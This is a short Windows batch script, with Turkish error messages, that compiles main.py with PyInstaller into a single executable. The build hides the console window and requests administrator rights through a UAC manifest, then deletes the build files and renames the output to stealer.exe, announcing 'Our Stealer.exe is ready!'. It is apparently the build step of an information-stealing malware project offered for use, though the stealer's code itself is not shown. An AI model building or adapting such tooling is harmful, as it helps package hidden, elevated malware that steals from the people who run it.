@echo off
echo Installing PyInstaller...
pip install pyinstaller
if errorlevel 1 (
    echo Hata: PyInstaller yüklenemedi!
    exit /b 1
)

@echo off
echo Starting PyInstaller...
pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest .\main.py

echo PyInstaller Finished!
set scriptDir=%~dp0
cd /d "%scriptDir%dist"
if exist main.exe (
    move main.exe ..
) else (
    echo Hata: main.exe bulunamadı!
    exit /b 1
)

cd ..
echo Cleaning up...
powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"
DEL main.spec
echo Temporary files deleted!

ren main.exe stealer.exe
if errorlevel 1 (
    echo Hata: File ren error!
    exit /b 1
)

echo Our Stealer.exe is ready!
